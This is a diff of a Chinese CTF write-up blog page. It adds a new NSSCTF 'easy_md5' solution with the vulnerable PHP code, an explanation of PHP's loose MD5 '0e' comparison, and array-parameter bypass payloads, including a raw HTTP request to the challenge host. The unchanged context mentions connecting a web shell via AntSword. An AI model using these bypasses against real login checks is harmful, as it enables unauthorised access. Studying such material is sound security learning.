@@ -25,7 +25,7 @@
 <meta property="og:description" content="来几个writeup这里将长期更新我作为新手遇到的有趣的题目的个人做题想法与见解，不定期更新，写手水平较菜，有问题请提出哦。 一.攻防世界1.php2(web)首页我们可以看到： 	 Can you anthenticate to this website?  在这里我们首要想到尝试访问首页和一些关键目录及敏感文件 	 1234567891011&#x2F;index.phps &#x2F;login.phps &#x2F;a">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-01-31T10:19:14.000Z">
-<meta property="article:modified_time" content="2026-02-05T13:10:58.460Z">
+<meta property="article:modified_time" content="2026-02-11T08:56:37.506Z">
 <meta property="article:author" content="Cl1ck-t0">
 <meta property="article:tag" content="buuctf">
 <meta property="article:tag" content="攻防世界">
@@ -137,7 +137,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%A5%E5%87%A0%E4%B8%AAwriteup"><span class="toc-number">1.</span> <span class="toc-text">来几个writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C"><span class="toc-number">1.1.</span> <span class="toc-text">一.攻防世界</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-php2-web"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.php2(web)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-CatCatCat-misc"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.CatCatCat(misc)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-ics-06-web"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.ics-06(web)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-view-source"><span class="toc-number">1.1.4.</span> <span class="toc-text">4.view_source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Web-php-include-web"><span class="toc-number">1.1.5.</span> <span class="toc-text">5.Web_php_include(web)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup01"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">writeup01</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup02"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">writeup02</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup03"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">writeup03</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-upload1-web"><span class="toc-number">1.1.6.</span> <span class="toc-text">5.upload1(web)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-buuctf"><span class="toc-number">1.2.</span> <span class="toc-text">二.buuctf</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%A5%E5%87%A0%E4%B8%AAwriteup"><span class="toc-number">1.</span> <span class="toc-text">来几个writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C"><span class="toc-number">1.1.</span> <span class="toc-text">一.攻防世界</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-php2-web"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.php2(web)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-CatCatCat-misc"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.CatCatCat(misc)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-ics-06-web"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.ics-06(web)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-view-source"><span class="toc-number">1.1.4.</span> <span class="toc-text">4.view_source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Web-php-include-web"><span class="toc-number">1.1.5.</span> <span class="toc-text">5.Web_php_include(web)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup01"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">writeup01</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup02"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">writeup02</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup03"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">writeup03</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-upload1-web"><span class="toc-number">1.1.6.</span> <span class="toc-text">5.upload1(web)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-buuctf"><span class="toc-number">1.2.</span> <span class="toc-text">二.buuctf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-NSSCTF"><span class="toc-number">1.3.</span> <span class="toc-text">三.NSSCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-easy-md5"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.easy_md5</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -197,7 +197,7 @@
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
     <time datetime="2026-01-31T10:19:14.000Z" itemprop="datePublished">2026-01-31</time>
-    <time style="display: none;" id="post-update-time">2026-02-05</time>
+    <time style="display: none;" id="post-update-time">2026-02-11</time>
   </span>
 </div>
 
@@ -299,6 +299,23 @@
 <p>然后用蚁剑连接，密码就是自己设置的123；(注意URL要文件详细路径才能连接成功)</p>
 <p>然后找到flag。</p>
 <h2 id="二-buuctf"><a href="#二-buuctf" class="headerlink" title="二.buuctf"></a>二.buuctf</h2><p>此处还在施(tou)工(lan)</p>
+<h2 id="三-NSSCTF"><a href="#三-NSSCTF" class="headerlink" title="三.NSSCTF"></a>三.NSSCTF</h2><h3 id="1-easy-md5"><a href="#1-easy-md5" class="headerlink" title="1.easy_md5"></a>1.easy_md5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> highlight_file(__FILE__);</span><br><span class="line"> include &#x27;flag2.php&#x27;;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123;</span><br><span class="line">  $name = $_GET[&#x27;name&#x27;];</span><br><span class="line">  $password = $_POST[&#x27;password&#x27;];</span><br><span class="line">  if ($name != $password &amp;&amp; md5($name) == md5($password))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    echo &quot;wrong!&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">  echo &#x27;wrong!&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>本题是利用了<strong>MD5哈希比较漏洞</strong>，条件要求：</p>
+<ol>
+<li><code>name</code> (GET参数) 和 <code>password</code> (POST参数) <strong>值不相等</strong></li>
+<li>但它们的 <strong>MD5哈希值相等</strong>（使用<code>==</code>弱类型比较）</li>
+</ol>
+<p>攻击原理：</p>
+<p>当比较0e开头的字符串时，php会将其视为科学计数法的0；</p>
+<p>eg.<code>0e123456</code> &#x3D;&#x3D; <code>0e987654</code> 会被视为 <code>0 == 0</code>，返回true;</p>
+<p>因此，此题便看明白了，我们只需要分别搞一个0e开头的字符串给name和password参数，便可；</p>
+<p>于是我们用burpsuite抓包(用hackbar更快点)，改成这样就能拿到flag；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /?name=QNKCDZO HTTP/1.1</span><br><span class="line">Host: node7.anna.nssctf.cn:23851</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 18</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">password=240610708</span><br></pre></td></tr></table></figure>
+
+<p>当然，本题还可以使用数组绕过。</p>
+<p>原理:MD5不能加密数组，传入数组会报错，但是会继续执行返回结果null，&#x3D;&#x3D;为弱类型比较，判断为相等，因此打开hackbar输入</p>
+<p>&#x2F;?name[]&#x3D;123  password[]&#x3D;456 也可以得到flag。</p>
 
     </div>
     <footer class="article-footer">
@@ -307,7 +324,7 @@
     <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/01/31/%E7%AE%80%E5%8D%95%E9%A2%98writeup/">https://cl1ck-t0.github.io/2026/01/31/%E7%AE%80%E5%8D%95%E9%A2%98writeup/</a></p>
     
     <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-01-31 18:19:14</p>
-    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-02-05 21:10:58</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-02-11 16:56:37</p>
     <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
     <span class="icon-creative-commons article-copyright-bg"></span>
   </blockquote>
@@ -349,7 +366,7 @@
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
       <div class="article-nav-link-wrap left">
-            <img data-src="/covers/furina-5k-genshin-3840x2160-13884.jpg" data-sizes="auto" alt="PHP反序列化漏洞" class="lazyload">
+            <img data-src="/covers/39e140edac9ea960ff5b1c27f5316a89.jpg" data-sizes="auto" alt="PHP反序列化漏洞" class="lazyload">
         <a href="/2026/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" aria-label="Prev: PHP反序列化漏洞" title="Prev: PHP反序列化漏洞"></a>
         <div class="article-nav-caption">Prev</div>
         <h3 class="article-nav-title">
@@ -357,7 +374,7 @@
         </h3>
       </div>
     <div class="article-nav-link-wrap right">
-          <img data-src="/covers/castorice-purple-3840x2160-22219.jpg" data-sizes="auto" alt="流量分析" class="lazyload">
+          <img data-src="/covers/a313a5b13f55b09555bfaa524b212f13.jpg" data-sizes="auto" alt="流量分析" class="lazyload">
       <a href="/2025/12/30/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" aria-label="Next: 流量分析"  title="Next: 流量分析"></a>
       <div class="article-nav-caption">Next</div>
       <h3 class="article-nav-title">
@@ -406,10 +423,10 @@
       </div>
       <div>
         <span class="icon-brush"></span>
-        14.4k
+        14.8k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        01:09
+        01:11
       </div>
       <div>
         <span class="icon-eye"></span>
@@ -431,7 +448,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%A5%E5%87%A0%E4%B8%AAwriteup"><span class="toc-number">1.</span> <span class="toc-text">来几个writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C"><span class="toc-number">1.1.</span> <span class="toc-text">一.攻防世界</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-php2-web"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.php2(web)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-CatCatCat-misc"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.CatCatCat(misc)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-ics-06-web"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.ics-06(web)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-view-source"><span class="toc-number">1.1.4.</span> <span class="toc-text">4.view_source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Web-php-include-web"><span class="toc-number">1.1.5.</span> <span class="toc-text">5.Web_php_include(web)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup01"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">writeup01</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup02"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">writeup02</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup03"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">writeup03</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-upload1-web"><span class="toc-number">1.1.6.</span> <span class="toc-text">5.upload1(web)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-buuctf"><span class="toc-number">1.2.</span> <span class="toc-text">二.buuctf</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%A5%E5%87%A0%E4%B8%AAwriteup"><span class="toc-number">1.</span> <span class="toc-text">来几个writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C"><span class="toc-number">1.1.</span> <span class="toc-text">一.攻防世界</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-php2-web"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.php2(web)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-CatCatCat-misc"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.CatCatCat(misc)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-ics-06-web"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.ics-06(web)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-view-source"><span class="toc-number">1.1.4.</span> <span class="toc-text">4.view_source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Web-php-include-web"><span class="toc-number">1.1.5.</span> <span class="toc-text">5.Web_php_include(web)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup01"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">writeup01</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup02"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">writeup02</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup03"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">writeup03</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-upload1-web"><span class="toc-number">1.1.6.</span> <span class="toc-text">5.upload1(web)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-buuctf"><span class="toc-number">1.2.</span> <span class="toc-text">二.buuctf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-NSSCTF"><span class="toc-number">1.3.</span> <span class="toc-text">三.NSSCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-easy-md5"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.easy_md5</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -557,7 +574,7 @@
           description: "",
           stripContent: "来几个writeup这里将长期更新我作为新手遇到的有趣的题目的个人做题想法与见解，不定期更新，写手水平较菜，有问题请提出哦。 一.攻防世界1.php2(web)首页我们可以看到：   Can you anthenticate to this website?  在这里我们首要想到尝试访问首页和一些关键目录及敏感文件   1234567891011/index.phps /login.phps /admin.phps /config.phps /flag.phps /backup.phps /in",
           date: "Sat Jan 31 2026 18:19:14 GMT+0800",
-          updated: "Thu Feb 05 2026 21:10:58 GMT+0800",
+          updated: "Wed Feb 11 2026 16:56:37 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
